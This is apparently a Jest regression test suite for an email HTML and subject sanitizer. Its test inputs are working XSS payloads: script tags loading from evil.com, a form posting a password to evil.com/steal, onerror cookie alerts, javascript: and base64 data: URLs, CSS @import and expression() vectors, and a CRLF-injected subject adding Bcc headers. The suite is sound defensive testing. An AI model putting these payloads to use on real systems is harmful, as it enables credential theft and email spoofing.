import {
  sanitizeEmailHtml,
  sanitizeEmailTemplateHtml,
  sanitizeSubject,
  sanitizeCssContent,
  sanitizePlainText,
} from './content-sanitizer.util';

describe('Content Sanitizer Security Regression Suite', () => {
  describe('Script and Execution Tag Elimination', () => {
    it('should strip <script> tags completely', () => {
      const payload = '<p>Normal</p><script>alert("pwned")</script>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert');
      expect(result).toBe('<p>Normal</p>');
    });

    it('should strip mixed-case <sCrIpt> tags', () => {
      const payload =
        '<div>Safe</div><sCrIpt src="http://evil.com/xss.js"></ScRiPt>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('sCrIpt');
      expect(result).not.toContain('evil.com');
      expect(result).toBe('<div>Safe</div>');
    });

    it('should discard <iframe> tags', () => {
      const payload = '<iframe src="https://phishing.com"></iframe>';
      const result = sanitizeEmailHtml(payload);
      expect(result).toBe('');
    });

    it('should discard <object> and <embed> tags', () => {
      const payload = '<object data="evil.swf"></object><embed src="evil.swf">';
      const result = sanitizeEmailHtml(payload);
      expect(result).toBe('');
    });

    it('should discard <svg> tags and onload handlers', () => {
      const payload =
        '<svg onload="alert(1)"><circle cx="50" cy="50" r="40" /></svg>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('<svg');
      expect(result).not.toContain('onload');
    });

    it('should discard <form> tags and inputs', () => {
      const payload =
        '<form action="http://evil.com/steal" method="POST"><input type="password" name="pwd"><button>Submit</button></form>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('<form');
      expect(result).not.toContain('action=');
    });
  });

  describe('Event Handler Attribute Elimination', () => {
    it('should strip onerror attributes on <img> tags', () => {
      const payload =
        '<img src="invalid.jpg" onerror="alert(document.cookie)" />';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
      expect(result).toContain('<img src="invalid.jpg" />');
    });

    it('should strip mixed-case OnErRoR attributes', () => {
      const payload = '<img src="x" OnErRoR="alert(1)" />';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('OnErRoR');
      expect(result).not.toContain('alert');
    });

    it('should strip onclick, onmouseover, and onload handlers', () => {
      const payload =
        '<a href="https://example.com" onclick="alert(1)" onmouseover="steal()">Click</a>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('onmouseover');
      expect(result).toBe('<a href="https://example.com">Click</a>');
    });
  });

  describe('URI Scheme Security on Links and Images', () => {
    it('should strip javascript: URLs from <a> href', () => {
      const payload = '<a href="javascript:alert(1)">Click Me</a>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('javascript:');
      expect(result).toBe('<a>Click Me</a>');
    });

    it('should strip obfuscated/entity-encoded javascript: URLs', () => {
      const payload = '<a href="jav&#x09;ascript:alert(1)">Click Me</a>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('javascript');
      expect(result).toBe('<a>Click Me</a>');
    });

    it('should strip vbscript: URLs from <a> href', () => {
      const payload = '<a href="vbscript:msgbox(1)">Click Me</a>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('vbscript');
    });

    it('should strip data: URLs from <a> href to prevent HTML smuggling', () => {
      const payload =
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Smuggle</a>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('data:');
      expect(result).toBe('<a>Smuggle</a>');
    });

    it('should allow data: URLs ONLY on <img> for embedded images', () => {
      const payload =
        '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==" alt="badge" />';
      const result = sanitizeEmailHtml(payload);
      expect(result).toContain('data:image/png;base64,');
    });
  });

  describe('CSS and Style Injection Neutralization', () => {
    it('should strip @import from <style> blocks', () => {
      const payload =
        '<style>@import url("http://evil.com/xss.css"); body { color: red; }</style>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('@import');
      expect(result).toContain('color: red;');
    });

    it('should strip expression() from CSS in <style> blocks', () => {
      const payload = '<style>div { width: expression(alert(1)); }</style>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('expression');
      expect(result).not.toContain('alert');
    });

    it('should strip -moz-binding from CSS in <style> blocks', () => {
      const payload =
        '<style>div { -moz-binding: url("http://evil.com/xss.xml#test"); }</style>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('-moz-binding');
    });

    it('should strip javascript: urls inside CSS url()', () => {
      const payload =
        '<style>div { background: url("javascript:alert(1)"); }</style>';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('javascript:');
    });

    it('sanitizeCssContent should neutralize all vectors independently', () => {
      const maliciousCss = `
        @import url("http://evil.com/style.css");
        body {
          behavior: url("evil.htc");
          -moz-binding: url("evil.xml");
          width: expression(alert('xss'));
          background: url('javascript:void(0)');
        }
      `;
      const cleaned = sanitizeCssContent(maliciousCss);
      expect(cleaned).not.toContain('@import');
      expect(cleaned).not.toContain('behavior');
      expect(cleaned).not.toContain('-moz-binding');
      expect(cleaned).not.toContain('expression');
      expect(cleaned).not.toContain('javascript:');
    });
  });

  describe('CRLF Subject Injection Prevention', () => {
    it('should strip newline and carriage return characters from subjects', () => {
      const maliciousSubject =
        'Your Booking Confirmed\r\nBcc: victim@example.com\r\nSubject: Spoofed';
      const sanitized = sanitizeSubject(maliciousSubject);
      expect(sanitized).not.toContain('\r');
      expect(sanitized).not.toContain('\n');
      expect(sanitized).toBe(
        'Your Booking Confirmed Bcc: victim@example.com Subject: Spoofed',
      );
    });

    it('should strip null bytes and ASCII control characters from subjects', () => {
      const maliciousSubject = 'Test\x00Injection\x1B[31mRed';
      const sanitized = sanitizeSubject(maliciousSubject);
      expect(sanitized).not.toContain('\x00');
      expect(sanitized).not.toContain('\x1B');
      expect(sanitized).toBe('Test Injection [31mRed');
    });
  });

  describe('Meta Tag Security', () => {
    it('should discard meta http-equiv="refresh" redirects', () => {
      const payload =
        '<meta http-equiv="refresh" content="0;url=http://evil.com" />';
      const result = sanitizeEmailHtml(payload);
      expect(result).not.toContain('http-equiv');
      expect(result).not.toContain('refresh');
    });

    it('should preserve safe meta charset and viewport tags', () => {
      const payload =
        '<meta charset="utf-8" /><meta name="viewport" content="width=device-width" />';
      const result = sanitizeEmailHtml(payload);
      expect(result).toContain('charset="utf-8"');
      expect(result).toContain('name="viewport"');
    });
  });
});
